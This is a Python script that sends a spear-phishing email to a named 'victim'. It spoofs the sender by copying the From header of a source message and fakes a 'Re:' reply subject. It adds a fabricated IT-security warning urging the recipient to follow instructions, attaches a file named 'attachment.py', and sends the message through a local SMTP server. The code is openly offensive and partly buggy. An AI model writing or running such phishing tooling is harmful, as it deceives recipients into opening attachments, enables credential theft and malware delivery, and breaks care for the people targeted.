import email
import smtplib as tp
from os.path import basename
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.utils import COMMASPACE, formatdate
import requests
import sys
from bs4 import BeautifulSoup


def buildMSG(sender, victim, subject, text, files=None, addFile=False):
    msg = MIMEMultipart()
    msg['From'] = sender
    msg['To'] = victim
    msg['Date'] = formatdate(localtime=True)
    msg['Subject'] = subject
    msg.attach(MIMEText(text))
    if (addFile):
        with open(files, "rb") as fil:
            part = MIMEApplication(fil.read(), Name=basename(files))
        part['Content-Disposition'] = 'attachment; filename="%s"' % basename(files)
        msg.attach(part)
    return msg


def isUrl(url):
    try:
        response = requests.get(url)
        return True
    except:
        return False


def is_file(filename):
    try:
        f = open(filename)
        f.close()
        return True
    except IOError:
        return False


def createmassage(text):
    k = ""
    e = ""
    for item in text.split("\n"):
        if "Dear" in item:
            k = item
        if "Your" in item:
            e = item
    msg = k + "\n" + """
We recently recived an instruction from the Manager of s that there is a fear of a Cyber attack against employees' computers
our team works hard to protect your computer.
Our advanced softwers has been discover a serious security issue on your computer.
Please follow the instruction for your computer's security.""" + "\n" + e
    return msg


def find_url_file(some_input):
    if isUrl(addF):
        page = requests.get(some_input)
        soup = BeautifulSoup(page.content, 'html.parser')
        body = soup.find('body')
        return body
    elif is_file(some_input):
        f = open(some_input)
        msg2 = f.read()
        f.close()
        return msg2
    else:
        return some_input


victim = sys.argv[1]
msn = sys.argv[2]
jobtitle = sys.argv[3]
addF = sys.argv[4]
msg = find_url_file(addF)
mssage = createmassage(msg)
stringtomsg = email.message_from_string(msg)
sender = stringtomsg['From']  # 'root@a1.local.tld'
subjectM = stringtomsg['Subject']
subj = "Re:" + stringtomsg['Subject']
sendTo = str(victim) + '@' + str(msn)
myMSG = buildMSG(sender, sendTo, subj, mssage, "attachment.py", True)
server = tp.SMTP("localhost", 25)
server.sendmail(sender, sendTo, myMSG.as_string())
print("mail sent")
